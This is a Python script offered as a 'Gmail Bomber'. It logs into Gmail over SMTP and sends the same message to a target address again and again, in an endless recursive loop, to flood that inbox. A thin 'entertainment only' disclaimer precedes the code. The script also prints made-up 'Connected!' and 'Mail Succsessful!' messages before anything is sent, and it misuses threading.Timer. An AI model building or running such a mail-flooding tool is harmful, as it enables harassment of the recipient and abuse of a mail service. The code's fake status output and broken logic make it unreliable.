import time
from smtplib import SMTP
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import sys
import threading
print("Ismail Efe Erdoğdu")
print("Welcome To Gmail Bomber For Python(GBFP)\ngithub.com/byk1lla\nThis Program is Still Under Development.\nPlease ignore my mistakes.\n!!!ATTENTION!!!\nTHIS PROGRAM IS FOR ENTERTAIMENT PURPOSES ONLY.\nDO NOT USE THE ILLEGAL PURPOSES.\nTHANK YOU FOR USE THE MY PROGRAM <3")


def send_mail():
    myMailAdress = "user@gmail.com"
    password = "password"
    Subject = "Hello!"
    message = "Thank You Use My Program <3"
    sendto = "target@gmail.com"
    content = "Subject:{0}\n\n{1}".format(Subject,message)
    mail = SMTP("smtp.gmail.com",587)
    mail.ehlo()
    mail.starttls()
    mail.login(myMailAdress,password)
    mail.sendmail(myMailAdress,sendto,content)

print("Connecting The Server.\nConnecting The Server...\nConnected!")

def threading_func():
    print("Mail Succsessful!")
    send_mail()
    time.sleep(5)
    timer_object = threading.Timer(5,threading_func())

send_mail()
threading_func()